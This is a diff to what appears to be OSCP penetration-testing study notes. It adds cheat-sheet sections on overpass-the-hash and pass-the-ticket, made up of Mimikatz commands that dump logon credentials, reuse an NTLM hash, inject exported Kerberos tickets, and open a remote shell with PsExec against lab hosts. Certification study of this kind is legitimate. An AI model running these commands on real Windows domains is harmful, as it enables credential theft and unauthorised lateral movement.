@@ -266,6 +266,26 @@ GetUserSPNs.py -request -dc-ip 10.129.193.5 active.htb/svc_tgs
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
 
+## Overpass the Hash
+```bash
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
+net use \\files04
+.\PsExec.exe \\files04 cmd
+```
+
+
+## Pass the Ticket
+```bash
+privilege::debug
+sekurlsa::tickets /export
+dir *.kirbi
+kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+ls \\web04\backup
+```
+
+
 ## Silver Tickets
 ![image](https://github.com/nuricheun/OSCP/assets/14031269/d19bd307-1d00-478a-925c-370b483dce13)
 ![image](https://github.com/nuricheun/OSCP/assets/14031269/472ec5a4-4224-4b09-b2c4-6662e97865d9)
